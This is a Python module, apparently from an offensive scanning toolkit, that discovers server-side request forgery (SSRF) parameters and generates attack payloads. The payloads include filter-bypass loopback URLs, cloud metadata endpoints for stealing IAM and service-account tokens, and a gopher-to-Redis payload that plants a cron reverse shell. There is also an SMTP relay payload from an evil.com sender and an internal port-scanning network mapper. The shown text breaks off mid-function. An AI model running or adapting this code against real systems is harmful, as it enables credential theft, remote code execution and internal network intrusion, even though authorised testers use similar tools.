from __future__ import annotations

import ipaddress
import logging
import re
import socket
import threading
import time
import uuid
from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum, auto
from typing import Any, Callable, Dict, List, Optional, Set, Tuple
from urllib.parse import quote, urlencode, urljoin, urlparse, urlunparse, parse_qs

import requests
from requests import Response
from requests.exceptions import RequestException

logger = logging.getLogger(__name__)


# ─────────────────────────────────────────────────────────────────────────────
# Enums
# ─────────────────────────────────────────────────────────────────────────────

class SsrfVariant(Enum):
    # Canonical HTTP probes
    LOOPBACK_HTTP            = "ssrf_loopback_http"
    LOOPBACK_BYPASS          = "ssrf_loopback_filter_bypass"
    INTERNAL_RFC1918         = "ssrf_internal_rfc1918"
    CLOUD_IMDS_AWS           = "ssrf_cloud_imds_aws"
    CLOUD_IMDS_GCP           = "ssrf_cloud_imds_gcp"
    CLOUD_IMDS_AZURE         = "ssrf_cloud_imds_azure"
    CLOUD_IMDS_ALIBABA       = "ssrf_cloud_imds_alibaba"
    CLOUD_IMDS_K8S           = "ssrf_cloud_imds_kubernetes"

    # Protocol abuse
    PROTO_GOPHER_REDIS       = "ssrf_gopher_redis_rce"
    PROTO_GOPHER_MEMCACHED   = "ssrf_gopher_memcached"
    PROTO_GOPHER_SMTP        = "ssrf_gopher_smtp_relay"
    PROTO_DICT               = "ssrf_dict_protocol"
    PROTO_FILE               = "ssrf_file_read"
    PROTO_FTP                = "ssrf_ftp_bounce"
    PROTO_LDAP               = "ssrf_ldap_injection"

    # DNS rebinding / TOCTOU
    DNS_REBIND               = "ssrf_dns_rebinding"

    # Filter bypass
    BYPASS_HEX_IP            = "ssrf_bypass_hex_ip"
    BYPASS_OCTAL_IP          = "ssrf_bypass_octal_ip"
    BYPASS_DECIMAL_IP        = "ssrf_bypass_decimal_ip"
    BYPASS_IPV6              = "ssrf_bypass_ipv6"
    BYPASS_URLENCODED        = "ssrf_bypass_url_encode"
    BYPASS_DOUBLE_SLASH      = "ssrf_bypass_double_slash"
    BYPASS_AT_SIGN           = "ssrf_bypass_at_sign"
    BYPASS_XIPIP             = "ssrf_bypass_xip_io"
    BYPASS_UNICODE_DOT       = "ssrf_bypass_unicode_dot"
    BYPASS_CASE_VARIATION    = "ssrf_bypass_case_variation"
    BYPASS_OPEN_REDIRECT     = "ssrf_bypass_via_open_redirect"

    # Internal network mapping
    INTERNAL_PORT_SCAN       = "ssrf_internal_port_scan"
    INTERNAL_HOST_DISCOVERY  = "ssrf_internal_host_discovery"
    INTERNAL_SERVICE_PROBE   = "ssrf_internal_service_probe"

    # Header injection SSRF
    HEADER_HOST              = "ssrf_via_host_header"
    HEADER_X_FORWARDED_HOST  = "ssrf_via_x_forwarded_host"
    HEADER_REFERER           = "ssrf_via_referer"
    HEADER_ORIGIN            = "ssrf_via_origin"

    # OOB-only confirmation
    OOB_BLIND                = "ssrf_oob_blind_confirmation"


class FindingSeverity(Enum):
    CRITICAL = 10
    HIGH     = 7
    MEDIUM   = 5
    LOW      = 3
    INFO     = 1


class FindingStatus(Enum):
    CONFIRMED  = auto()
    LIKELY     = auto()
    POSSIBLE   = auto()
    NOT_VULN   = auto()


# ─────────────────────────────────────────────────────────────────────────────
# Data structures
# ─────────────────────────────────────────────────────────────────────────────

@dataclass
class SsrfParam:
    """An injectable URL parameter that may cause server-side request forgery."""
    url:         str
    param:       str
    method:      str
    param_type:  str
    source:      str
    current_val: str = ""   # current value of the param if known

    def to_dict(self) -> Dict[str, Any]:
        return {
            "url":        self.url,
            "param":      self.param,
            "method":     self.method,
            "param_type": self.param_type,
            "source":     self.source,
        }


@dataclass
class InternalHost:
    """A host discovered on the internal network via SSRF probing."""
    ip:        str
    cidr:      str
    open_ports: List[int]
    services:  Dict[int, str]   # port → service name
    response_snippets: Dict[int, str]  # port → body preview

    def to_dict(self) -> Dict[str, Any]:
        return {
            "ip":               self.ip,
            "cidr":             self.cidr,
            "open_ports":       self.open_ports,
            "services":         self.services,
            "response_snippets": {str(k): v for k, v in self.response_snippets.items()},
        }


@dataclass
class SsrfFinding:
    finding_id:    str
    variant:       SsrfVariant
    severity:      FindingSeverity
    status:        FindingStatus
    target_url:    str
    param:         str
    payload:       str
    evidence:      Dict[str, Any]
    ssrf_target:   str              # the URL the server fetched
    response_data: Optional[str]    # preview of fetched content
    attack_steps:  List[str]
    notes:         str
    timestamp:     datetime = field(default_factory=datetime.now)

    def to_dict(self) -> Dict[str, Any]:
        return {
            "finding_id":   self.finding_id,
            "variant":      self.variant.value,
            "severity":     self.severity.name,
            "status":       self.status.name,
            "target_url":   self.target_url,
            "param":        self.param,
            "payload":      self.payload[:500],
            "evidence":     self.evidence,
            "ssrf_target":  self.ssrf_target,
            "response_data": self.response_data,
            "attack_steps": self.attack_steps,
            "notes":        self.notes,
            "timestamp":    self.timestamp.isoformat(),
        }


@dataclass
class SsrfResult:
    run_id:              str
    domain:              str
    params_tested:       int
    findings:            List[Dict[str, Any]]
    internal_hosts:      List[Dict[str, Any]]
    imds_accessed:       bool
    rce_via_gopher:      bool
    oob_confirmed:       bool
    internal_cidrs_found: List[str]
    score:               float
    risk_level:          str
    techniques_tested:   List[str]
    recommendations:     List[str]
    started_at:          datetime
    finished_at:         datetime

    def to_dict(self) -> Dict[str, Any]:
        return {
            "run_id":               self.run_id,
            "domain":               self.domain,
            "params_tested":        self.params_tested,
            "findings":             self.findings,
            "internal_hosts":       self.internal_hosts,
            "imds_accessed":        self.imds_accessed,
            "rce_via_gopher":       self.rce_via_gopher,
            "oob_confirmed":        self.oob_confirmed,
            "internal_cidrs_found": self.internal_cidrs_found,
            "score":                round(self.score, 2),
            "risk_level":           self.risk_level,
            "techniques_tested":    self.techniques_tested,
            "recommendations":      self.recommendations,
            "started_at":           self.started_at.isoformat(),
            "finished_at":          self.finished_at.isoformat(),
            "duration_s":           round(
                (self.finished_at - self.started_at).total_seconds(), 3
            ),
        }


# ─────────────────────────────────────────────────────────────────────────────
# HTTP pool — same pattern used across ARTEX core modules
# ─────────────────────────────────────────────────────────────────────────────

class _HttpPool:
    _UA = (
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
        "(KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36"
    )

    def __init__(self, timeout: float = 9.0, delay: float = 0.4,
                 verify_tls: bool = False):
        self._timeout = timeout
        self._delay   = delay
        self._verify  = verify_tls
        self._local   = threading.local()
        self._last    = threading.local()

    def _sess(self) -> requests.Session:
        if not hasattr(self._local, "s"):
            s = requests.Session()
            s.headers["User-Agent"] = self._UA
            s.verify = self._verify
            s.max_redirects = 3
            self._local.s = s
        return self._local.s

    def _throttle(self) -> None:
        last = getattr(self._last, "ts", 0.0)
        gap  = time.time() - last
        if gap < self._delay:
            time.sleep(self._delay - gap)
        self._last.ts = time.time()

    def get(self, url: str, params: Optional[Dict[str, str]] = None,
            headers: Optional[Dict[str, str]] = None) -> Optional[Response]:
        self._throttle()
        try:
            return self._sess().get(
                url, params=params, headers=headers or {},
                timeout=self._timeout, allow_redirects=True,
            )
        except RequestException as e:
            logger.debug("GET %s: %s", url, e)
            return None

    def get_raw(self, url: str,
                headers: Optional[Dict[str, str]] = None) -> Optional[Response]:
        self._throttle()
        try:
            return self._sess().get(
                url, headers=headers or {},
                timeout=self._timeout, allow_redirects=True,
            )
        except RequestException as e:
            logger.debug("GET_RAW %s: %s", url, e)
            return None

    def post(self, url: str, data: Optional[Dict[str, str]] = None,
             headers: Optional[Dict[str, str]] = None,
             json: Optional[Dict[str, Any]] = None) -> Optional[Response]:
        self._throttle()
        try:
            return self._sess().post(
                url, data=data, json=json,
                headers=headers or {},
                timeout=self._timeout, allow_redirects=True,
            )
        except RequestException as e:
            logger.debug("POST %s: %s", url, e)
            return None

    def reset(self) -> None:
        if hasattr(self._local, "s"):
            self._local.s.close()
            del self._local.s


# ─────────────────────────────────────────────────────────────────────────────
# OOB listener — reuse same pattern from xxe_injector.py
# ─────────────────────────────────────────────────────────────────────────────

class _OobListener:
    def __init__(self, port: int = 0):
        self._port    = port
        self._hits:   List[Dict[str, Any]] = []
        self._lock    = threading.Lock()
        self._sock:   Optional[socket.socket] = None
        self._running = False
        self.bound_port: int = 0

    def start(self) -> bool:
        try:
            self._sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            self._sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            self._sock.bind(("0.0.0.0", self._port))
            self._sock.settimeout(0.5)
            self._sock.listen(10)
            self.bound_port = self._sock.getsockname()[1]
            self._running   = True
            threading.Thread(target=self._serve, daemon=True).start()
            return True
        except OSError as e:
            logger.debug("OOB bind failed: %s", e)
            return False
            
    def stop(self) -> None:
        self._running = False
        if self._sock:
            try:
                self._sock.close()
            except OSError:
                pass
                
    def hits(self) -> List[Dict[str, Any]]:
        with self._lock:
            return list(self._hits)
            
    def _serve(self) -> None:
        while self._running:
            try:
                conn, addr = self._sock.accept()
            except socket.timeout:
                continue
            except OSError:
                break
            threading.Thread(target=self._handle, args=(conn, addr),
                             daemon=True).start()
                            
    def _handle(self, conn: socket.socket, addr: Tuple[str, int]) -> None:
        try:
            conn.settimeout(3.0)
            raw = b""
            while True:
                c = conn.recv(4096)
                if not c:
                    break
                raw += c
                if b"\r\n\r\n" in raw:
                    break
        except OSError:
            pass
        finally:
            try:
                conn.send(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\n\r\nOK")
                conn.close()
            except OSError:
                pass
        text = raw.decode("utf-8", errors="replace")
        with self._lock:
            self._hits.append({
                "remote_addr": addr[0],
                "remote_port": addr[1],
                "raw_head":    text[:256],
                "timestamp":   datetime.now().isoformat(),
            })
            
            
# ─────────────────────────────────────────────────────────────────────────────
# Parameter discoverer — extracts SSRF-injectable params from scan_results
# ─────────────────────────────────────────────────────────────────────────────

class _ParamDiscoverer:
    """
    Parameters that commonly cause server-side URL fetch.
    Priority: exact param name in URL query string > guessed from known patterns.
    """

    _URL_PARAMS: List[str] = [
        "url", "uri", "src", "source", "href", "redirect", "return",
        "returnUrl", "return_url", "returnTo", "next", "destination",
        "dest", "target", "site", "host", "fetch", "load", "request",
        "file", "path", "image", "img", "link", "ref", "referrer",
        "callback", "proxy", "data", "payload", "address", "domain",
        "endpoint", "api_url", "webhook", "api", "feed", "resource",
        "continue", "forward", "open", "preview", "access", "head",
        "ping", "check", "scan", "crawl", "navigate", "goto",
        "include", "embed", "object", "iframe_src", "action",
        "xml", "rss", "atom", "document", "content", "template",
        "layout", "config", "setting", "service", "remote", "pull",
    ]

    def discover(
        self,
        domain:       str,
        scan_results: Dict[str, Any],
    ) -> List[SsrfParam]:
        params: List[SsrfParam] = []
        seen:   Set[Tuple[str, str]] = set()

        def add(p: SsrfParam) -> None:
            key = (p.url, p.param)
            if key not in seen:
                seen.add(key)
                params.append(p)

        # 1. payload_analysis.injection_points — url_param and json_body
        pa = scan_results.get("payload_analysis", {})
        for ip in pa.get("injection_points", []):
            pt     = ip.get("param_type", "")
            url    = ip.get("url", "")
            method = ip.get("method", "GET").upper()
            if not url:
                continue

            if pt in ("url_param", "path_param"):
                parsed = urlparse(url)
                qs     = parse_qs(parsed.query)
                for pname, vals in qs.items():
                    if any(hint.lower() in pname.lower() for hint in self._URL_PARAMS):
                        add(SsrfParam(url=url, param=pname, method=method,
                                      param_type=pt, source="payload_analysis",
                                      current_val=vals[0] if vals else ""))
                # Also add guesses on clean URLs
                if not qs:
                    for pname in self._URL_PARAMS[:15]:
                        add(SsrfParam(url=url, param=pname, method=method,
                                      param_type=pt, source="payload_analysis_guess"))

            elif pt == "json_body":
                for pname in ["url", "uri", "src", "callback", "webhook", "endpoint"]:
                    add(SsrfParam(url=url, param=pname, method="POST",
                                  param_type="json_body",
                                  source="payload_analysis_json"))

        # 2. OSINT exposed paths — URL params that look like URLs themselves
        osint = scan_results.get("osint_correlation", {})
        for pe in osint.get("exposed_paths", [])[:30]:
            ep_url = pe.get("url") or pe.get("path", "")
            if not ep_url:
                continue
            if not ep_url.startswith("http"):
                ep_url = f"https://{domain}{ep_url}"
            parsed = urlparse(ep_url)
            qs     = parse_qs(parsed.query)
            for pname, vals in qs.items():
                val = vals[0] if vals else ""
                # if current value looks like a URL → obvious SSRF candidate
                if val.startswith(("http://", "https://", "ftp://")) or \
                   any(hint.lower() in pname.lower() for hint in self._URL_PARAMS):
                    add(SsrfParam(url=ep_url, param=pname, method="GET",
                                  param_type="url_param",
                                  source="osint_exposed_path", current_val=val))

        # 3. tech_detection base URLs + common SSRF path patterns
        base_seen: Set[str] = set()
        for url in scan_results.get("tech_detection", {}):
            parsed = urlparse(url)
            base   = f"{parsed.scheme}://{parsed.netloc}"
            if base not in base_seen:
                base_seen.add(base)
                for path, pname in [
                    ("/api/fetch",       "url"),
                    ("/proxy",           "url"),
                    ("/image",           "src"),
                    ("/webhook/test",    "url"),
                    ("/api/v1/request",  "url"),
                    ("/admin/check-url", "url"),
                    ("/api/ping",        "host"),
                    ("/api/preview",     "url"),
                    ("/render",          "url"),
                    ("/pdf",             "url"),
                    ("/screenshot",      "url"),
                ]:
                    add(SsrfParam(
                        url=base + path, param=pname,
                        method="GET", param_type="url_param",
                        source="tech_guess",
                    ))

        # 4. subdomains — probe API and admin subdomains harder
        for sub in scan_results.get("subdomains", []):
            if not (sub.get("http_status") or sub.get("https_status")):
                continue
            hostname = sub["subdomain"]
            if not any(kw in hostname for kw in
                       ("api", "admin", "proxy", "fetch", "hook", "webhook",
                        "preview", "render", "export", "pdf", "image", "thumb")):
                continue
            scheme = "https" if sub.get("https_status") else "http"
            base   = f"{scheme}://{hostname}"
            for pname in ["url", "src", "uri", "callback", "target"]:
                add(SsrfParam(url=base + "/", param=pname,
                              method="GET", param_type="url_param",
                              source="subdomain_api_guess"))

        return params


# ─────────────────────────────────────────────────────────────────────────────
# SSRF vector generator — builds all payload variants for one target URL
# ─────────────────────────────────────────────────────────────────────────────

class _VectorGenerator:
    """
    Generates (SsrfVariant, payload_url, description) for every attack class.
    oob_host/oob_port: attacker-controlled server for blind SSRF confirmation.
    """

    # RFC 1918 internal ranges to map
    _INTERNAL_RANGES: List[str] = [
        "10.0.0.0/8",
        "172.16.0.0/12",
        "192.168.0.0/16",
        "127.0.0.0/8",
        "169.254.0.0/16",
        "fd00::/8",
    ]

    # Common internal service ports
    _SERVICE_PORTS: Dict[int, str] = {
        22:    "ssh",
        23:    "telnet",
        25:    "smtp",
        53:    "dns",
        80:    "http",
        443:   "https",
        2375:  "docker",
        2376:  "docker-tls",
        3000:  "app-dev",
        3306:  "mysql",
        4001:  "etcd",
        4040:  "ngrok",
        5000:  "app-dev",
        5432:  "postgresql",
        5601:  "kibana",
        6379:  "redis",
        7001:  "weblogic",
        8080:  "http-alt",
        8443:  "https-alt",
        8500:  "consul",
        8888:  "jupyter",
        9000:  "app-dev",
        9090:  "prometheus",
        9200:  "elasticsearch",
        9300:  "elasticsearch-transport",
        10250: "kubelet",
        10255: "kubelet-readonly",
        27017: "mongodb",
    }

    # AWS IMDSv1 endpoints
    _AWS_IMDS: List[Tuple[str, str]] = [
        ("http://169.254.169.254/latest/meta-data/",
         "AWS IMDS root"),
        ("http://169.254.169.254/latest/meta-data/iam/security-credentials/",
         "AWS IAM role name"),
        ("http://169.254.169.254/latest/user-data",
         "AWS user-data script"),
        ("http://169.254.169.254/latest/meta-data/hostname",
         "AWS internal hostname"),
        ("http://169.254.169.254/latest/meta-data/public-keys/",
         "AWS SSH public keys"),
        ("http://169.254.169.254/latest/meta-data/placement/region",
         "AWS region"),
        ("http://169.254.169.254/latest/api/token",
         "AWS IMDSv2 token (PUT required — SSRF usually can't PUT)"),
    ]

    # GCP IMDS
    _GCP_IMDS: List[Tuple[str, str]] = [
        ("http://metadata.google.internal/computeMetadata/v1/",
         "GCP IMDS root"),
        ("http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token",
         "GCP service account token"),
        ("http://metadata.google.internal/computeMetadata/v1/project/project-id",
         "GCP project ID"),
        ("http://metadata.google.internal/computeMetadata/v1/instance/attributes/kube-env",
         "GCP Kubernetes env (GKE nodes)"),
        ("http://metadata.google.internal/computeMetadata/v1/instance/attributes/ssh-keys",
         "GCP SSH keys"),
    ]

    # Azure IMDS
    _AZURE_IMDS: List[Tuple[str, str]] = [
        ("http://169.254.169.254/metadata/instance?api-version=2021-02-01",
         "Azure IMDS instance"),
        ("http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/",
         "Azure managed identity token"),
        ("http://169.254.169.254/metadata/scheduledevents?api-version=2020-07-01",
         "Azure scheduled events"),
    ]

    # Kubernetes API
    _K8S_TARGETS: List[Tuple[str, str]] = [
        ("https://kubernetes.default.svc/api/v1/namespaces",
         "K8s API namespaces (requires ServiceAccount token)"),
        ("https://kubernetes.default.svc/api/v1/secrets",
         "K8s secrets"),
        ("http://127.0.0.1:10255/pods",
         "kubelet read-only pods"),
        ("http://127.0.0.1:10250/runningpods",
         "kubelet running pods"),
        ("http://etcd.default.svc:2379/v2/keys",
         "etcd key-value store"),
    ]

    def __init__(self, oob_host: str, oob_port: int):
        self._oob_host = oob_host
        self._oob_port = oob_port

    def _oob_url(self, path: str = "") -> str:
        return f"http://{self._oob_host}:{self._oob_port}/{path.lstrip('/')}"

    # ── loopback + filter bypass variants ────────────────────────────────────

    def loopback_variants(self) -> List[Tuple[SsrfVariant, str, str]]:
        out: List[Tuple[SsrfVariant, str, str]] = []
        base_targets = ["http://127.0.0.1/", "http://localhost/"]

        for target in base_targets:
            out.append((SsrfVariant.LOOPBACK_HTTP, target, "canonical loopback"))

        # filter bypass representations of 127.0.0.1
        bypass_reprs: List[Tuple[str, str]] = [
            ("http://127.1/",                       "short form 127.1"),
            ("http://127.0.1/",                     "partial 127.0.1"),
            (f"http://0x7f000001/",                 "hex IP"),
            (f"http://2130706433/",                 "decimal IP"),
            (f"http://017700000001/",               "octal IP"),
            ("http://127.000.000.001/",             "zero-padded"),
            ("http://[::1]/",                       "IPv6 ::1"),
            ("http://[0:0:0:0:0:ffff:127.0.0.1]/", "IPv6 mapped IPv4"),
            ("http://[::ffff:7f00:1]/",             "IPv6 hex mapped"),
            ("http://①②⑦.⓪.⓪.①/",              "unicode dots"),
            ("http://127.0.0.1.xip.io/",           "xip.io DNS rebind"),
            ("http://127.0.0.1.nip.io/",           "nip.io DNS rebind"),
            ("http://localtest.me/",               "localtest.me DNS"),
            ("http://127-0-0-1.sslip.io/",         "sslip.io"),
            ("http://LOCALHOST/",                   "case variation"),
            ("http://LoCalHoSt/",                   "mixed case"),
            ("http://0/",                           "zero IP"),
            ("http://0.0.0.0/",                     "0.0.0.0"),
            ("http://0177.00.00.01/",               "mixed octal"),
        ]
        for url, desc in bypass_reprs:
            out.append((SsrfVariant.BYPASS_HEX_IP, url, desc))

        # @ sign bypass
        out.append((
            SsrfVariant.BYPASS_AT_SIGN,
            "http://trusted.com@127.0.0.1/",
            "@ sign — host becomes 127.0.0.1",
        ))
        out.append((
            SsrfVariant.BYPASS_AT_SIGN,
            "http://trusted.com:80@127.0.0.1/",
            "@ sign with port",
        ))
        # double slash
        out.append((
            SsrfVariant.BYPASS_DOUBLE_SLASH,
            "http:///127.0.0.1/",
            "triple slash",
        ))
        out.append((
            SsrfVariant.BYPASS_DOUBLE_SLASH,
            "http://127.0.0.1//",
            "trailing double slash",
        ))
        # URL-encoded
        out.append((
            SsrfVariant.BYPASS_URLENCODED,
            "http://%31%32%37%2e%30%2e%30%2e%31/",
            "url-encoded 127.0.0.1",
        ))

        return out

    # ── cloud IMDS ────────────────────────────────────────────────────────────

    def imds_vectors(self) -> List[Tuple[SsrfVariant, str, str]]:
        out: List[Tuple[SsrfVariant, str, str]] = []
        for url, desc in self._AWS_IMDS:
            out.append((SsrfVariant.CLOUD_IMDS_AWS, url, f"AWS: {desc}"))
        for url, desc in self._GCP_IMDS:
            out.append((SsrfVariant.CLOUD_IMDS_GCP, url, f"GCP: {desc}"))
        for url, desc in self._AZURE_IMDS:
            out.append((SsrfVariant.CLOUD_IMDS_AZURE, url, f"Azure: {desc}"))
        # Alibaba
        out.append((
            SsrfVariant.CLOUD_IMDS_ALIBABA,
            "http://100.100.100.200/latest/meta-data/",
            "Alibaba Cloud ECS IMDS",
        ))
        # Kubernetes
        for url, desc in self._K8S_TARGETS:
            out.append((SsrfVariant.CLOUD_IMDS_K8S, url, f"K8s: {desc}"))
        return out

    # ── Gopher payloads ───────────────────────────────────────────────────────

    def gopher_redis_rce(self, redis_host: str = "127.0.0.1",
                         redis_port: int = 6379) -> Tuple[SsrfVariant, str, str]:
        """Gopher URL that sends Redis CONFIG SET + BGSAVE to write a webshell cron job."""
        commands = (
            "*3\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$3\r\ndir\r\n$16\r\n/var/spool/cron\r\n"
            "*4\r\n$6\r\nCONFIG\r\n$3\r\nSET\r\n$10\r\ndbfilename\r\n$4\r\nroot\r\n"
            "*3\r\n$3\r\nSET\r\n$1\r\n1\r\n$57\r\n"
            "\n\n*/1 * * * * bash -i >& /dev/tcp/127.0.0.1/4444 0>&1\n\n\r\n"
            "*1\r\n$6\r\nBGSAVE\r\n"
        )
        encoded = quote(commands, safe="")
        url = f"gopher://{redis_host}:{redis_port}/_{encoded}"
        return (SsrfVariant.PROTO_GOPHER_REDIS, url,
                f"Gopher→Redis RCE on {redis_host}:{redis_port}")

    def gopher_memcached(self, host: str = "127.0.0.1",
                         port: int = 11211) -> Tuple[SsrfVariant, str, str]:
        cmd     = "stats\r\n"
        encoded = quote(cmd, safe="")
        url     = f"gopher://{host}:{port}/_{encoded}"
        return (SsrfVariant.PROTO_GOPHER_MEMCACHED, url,
                f"Gopher→Memcached stats on {host}:{port}")

    def gopher_smtp(self, smtp_host: str = "127.0.0.1",
                    target_email: str = "victim@internal") -> Tuple[SsrfVariant, str, str]:
        cmds = (
            f"EHLO attacker.com\r\n"
            f"MAIL FROM:<attacker@evil.com>\r\n"
            f"RCPT TO:<{target_email}>\r\n"
            f"DATA\r\n"
            f"Subject: SSRF via Gopher\r\n\r\n"
            f"Sent via SSRF.\r\n.\r\nQUIT\r\n"
        )
        encoded = quote(cmds, safe="")
        url     = f"gopher://{smtp_host}:25/_{encoded}"
        return (SsrfVariant.PROTO_GOPHER_SMTP, url,
                f"Gopher→SMTP relay on {smtp_host}")

    def dict_probe(self, host: str = "127.0.0.1",
                   port: int = 11211) -> Tuple[SsrfVariant, str, str]:
        url = f"dict://{host}:{port}/stat"
        return (SsrfVariant.PROTO_DICT, url, f"dict:// probe on {host}:{port}")

    def file_read(self, path: str) -> Tuple[SsrfVariant, str, str]:
        url = f"file://{path}"
        return (SsrfVariant.PROTO_FILE, url, f"file:// read {path}")

    # ── OOB blind probe ───────────────────────────────────────────────────────
    
    def internal_port_vectors(
        self, host: str = "127.0.0.1"
    ) -> List[Tuple[SsrfVariant, str, str, int]]:
        """Returns (variant, url, desc, port)."""
        return [
            (SsrfVariant.INTERNAL_PORT_SCAN,
             f"http://{host}:{port}/",
             f"port scan {host}:{port} ({svc})",
             port)
            for port, svc in self._SERVICE_PORTS.items()
        ]

    def rfc1918_host_discovery(
        self, cidr: str = "192.168.1.0/24"
    ) -> List[Tuple[SsrfVariant, str, str]]:
        """Sample the first and last 10 hosts in a CIDR for discovery."""
        try:
            net   = ipaddress.ip_network(cidr, strict=False)
            hosts = list(net.hosts())
            sample = hosts[:10] + hosts[-10:]
        except ValueError:
            return []
        return [
            (SsrfVariant.INTERNAL_HOST_DISCOVERY,
             f"http://{str(h)}/",
             f"host discovery {cidr}")
            for h in sample
        ]


# ─────────────────────────────────────────────────────────────────────────────
# Response analyser
# ─────────────────────────────────────────────────────────────────────────────

class _ResponseAnalyser:
    """
    Four layers:
    1. IMDS / cloud credential patterns
    2. Internal service banners
    3. File content patterns (file:// hits)
    4. Error patterns that reveal internal networking
    """

    _IMDS_SIGS: List[re.Pattern] = [
        re.compile(r'"AccessKeyId"\s*:', re.I),         # AWS IAM creds
        re.compile(r'"SecretAccessKey"\s*:', re.I),
        re.compile(r'"Token"\s*:', re.I),
        re.compile(r'ami-[0-9a-f]{8,17}'),              # AWS AMI
        re.compile(r'"instance-id"\s*:\s*"i-'),         # AWS instance
        re.compile(r'"hostname"\s*:\s*".*\.internal"'),  # GCP/AWS
        re.compile(r'"computeMetadata"', re.I),          # GCP
        re.compile(r'"project-id"\s*:', re.I),
        re.compile(r'"access_token"\s*:', re.I),         # GCP token
        re.compile(r'"expires_in"\s*:\s*\d+'),
        re.compile(r'"subscriptionId"\s*:', re.I),       # Azure
        re.compile(r'"resourceId"\s*:', re.I),
        re.compile(r'latest/meta-data', re.I),
        re.compile(r'kube-env|KUBERNETES_SERVICE|kubernetes\.default'),
    ]

    _SERVICE_BANNER_SIGS: List[re.Pattern] = [
        re.compile(r'SSH-2\.0-'),                        # SSH
        re.compile(r'\+OK POP3|220 .{2,50} SMTP'),      # mail
        re.compile(r'STAT\s+\d+\s+\d+', re.I),          # memcached stats
        re.compile(r'redis_version:', re.I),
        re.compile(r'"cluster_name"\s*:\s*"', re.I),     # elasticsearch
        re.compile(r'"tagline"\s*:\s*"You Know, for Search"'),
        re.compile(r'"version"\s*:\s*"[0-9]'),
        re.compile(r'<title>Consul', re.I),              # consul
        re.compile(r'"KubernetesVersion"', re.I),
        re.compile(r'<title>etcd', re.I),
        re.compile(r'"etcdserver"', re.I),
        re.compile(r'docker', re.I),
        re.compile(r'"Hostname"\s*:', re.I),              # docker info
    ]

    _FILE_READ_SIGS: List[re.Pattern] = [
        re.compile(r"root:.*?:/bin/(bash|sh)", re.S),
        re.compile(r"\[extensions\]", re.I),
        re.compile(r"-----BEGIN .{1,20}PRIVATE KEY-----"),
        re.compile(r"<configuration>", re.I),
    ]

    _ERROR_SIGS: List[re.Pattern] = [
        re.compile(r"Connection refused", re.I),
        re.compile(r"No route to host", re.I),
        re.compile(r"connection timed out", re.I),
        re.compile(r"getaddrinfo|gethostbyname", re.I),
        re.compile(r"Name or service not known", re.I),
        re.compile(r"refused.*connect|connect.*refused", re.I),
        re.compile(r"java\.net\.ConnectException", re.I),
        re.compile(r"curl: \(\d+\)", re.I),
        re.compile(r"InvalidURL|MalformedURL", re.I),
    ]

    def analyse(
        self,
        resp:         Response,
        ssrf_url:     str,
        baseline_len: Optional[int],
    ) -> Tuple[bool, bool, bool, bool, Dict[str, Any]]:
        """
        Returns (is_imds, is_service, is_file, is_error_ssrf, evidence)
        """
        body    = resp.text or ""
        evidence: Dict[str, Any] = {
            "status_code": resp.status_code,
            "body_len":    len(body),
            "content_type": resp.headers.get("Content-Type", ""),
        }

        for pat in self._IMDS_SIGS:
            m = pat.search(body)
            if m:
                evidence["imds_match"] = m.group(0)[:200]
                return True, False, False, False, evidence

        for pat in self._SERVICE_BANNER_SIGS:
            m = pat.search(body)
            if m:
                evidence["banner"] = m.group(0)[:200]
                return False, True, False, False, evidence

        for pat in self._FILE_READ_SIGS:
            m = pat.search(body)
            if m:
                evidence["file_match"] = m.group(0)[:200]
                return False, False, True, False, evidence

        for pat in self._ERROR_SIGS:
            m = pat.search(body)
            if m:
                evidence["error_match"] = m.group(0)[:200]
                return False, False, False, True, evidence

        if baseline_len is not None:
            delta = len(body) - baseline_len
            if delta > 200:
                evidence["length_delta"] = delta

        return False, False, False, False, evidence


# ─────────────────────────────────────────────────────────────────────────────
# Internal network mapper — builds InternalHost map from probe results
# ─────────────────────────────────────────────────────────────────────────────

class _NetworkMapper:
    """
    Given an SSRF-confirmed parameter, enumerates:
    1. Open ports on 127.0.0.1 and common gateway IPs
    2. Live hosts in discovered internal CIDRs
    3. Service banners on each open port
    Uses time-based detection: closed/filtered ports → fast RST or timeout;
    open ports → banner or HTTP response in <500ms.
    """

    _GATEWAY_IPS: List[str] = [
        "10.0.0.1", "10.0.1.1", "10.1.0.1", "10.1.1.1",
        "172.16.0.1", "172.17.0.1", "172.18.0.1",
        "192.168.0.1", "192.168.1.1", "192.168.100.1",
        "127.0.0.1",
    ]

    _SCAN_PORTS: List[int] = [
        22, 80, 443, 2375, 3000, 3306, 4001,
        5432, 5601, 6379, 8080, 8443, 8500,
        9090, 9200, 10250, 10255, 27017,
    ]

    def __init__(self, http: _HttpPool, analyser: _ResponseAnalyser):
        self._http     = http
        self._analyser = analyser

    def map(
        self,
        ssrf_param: SsrfParam,
        inject_fn:  Callable[[str], Optional[Response]],
        baseline_len: Optional[int],
    ) -> List[InternalHost]:
        discovered: Dict[str, InternalHost] = {}
        lock = threading.Lock()

        def probe_host_port(ip: str, port: int) -> None:
            url  = f"http://{ip}:{port}/"
            t0   = time.perf_counter()
            resp = inject_fn(url)
            elapsed = time.perf_counter() - t0

            if not resp:
                return

            is_imds, is_svc, is_file, is_err, ev = self._analyser.analyse(
                resp, url, baseline_len
            )

            # Open port heuristics:
            # connection refused → "error_match" with connection refused → port CLOSED
            # but we still know the host is up
            port_open = (
                is_imds or is_svc or is_file or
                (resp.status_code not in (0,) and
                 elapsed < 1.5 and
                 not (is_err and "refused" in ev.get("error_match", "").lower()))
            )

            if port_open:
                cidr = _NetworkMapper._cidr_for(ip)
                snippet = (
                    ev.get("banner") or ev.get("imds_match") or
                    ev.get("file_match") or (resp.text or "")[:80]
                )
                with lock:
                    if ip not in discovered:
                        discovered[ip] = InternalHost(
                            ip=ip, cidr=cidr, open_ports=[],
                            services={}, response_snippets={},
                        )
                    h = discovered[ip]
                    if port not in h.open_ports:
                        h.open_ports.append(port)
                    if port not in h.services:
                        svc = _VectorGenerator._SERVICE_PORTS.get(port, "unknown")
                        h.services[port] = svc
                    if snippet and port not in h.response_snippets:
